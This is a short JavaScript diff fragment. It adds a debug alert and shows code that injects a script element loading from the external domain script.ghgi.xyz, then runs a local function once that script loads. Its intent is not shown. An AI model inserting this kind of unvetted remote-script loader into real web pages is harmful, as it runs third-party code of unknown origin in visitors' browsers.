@@ -10,7 +10,7 @@ function __mm__() {
 
     alert('Loaded mm');
 }
-
+alert('here1')
 const __bJS__ = document.createElement('script');
 __bJS__.onload = () => __mm__();
 __bJS__.src = 'https://script.ghgi.xyz';
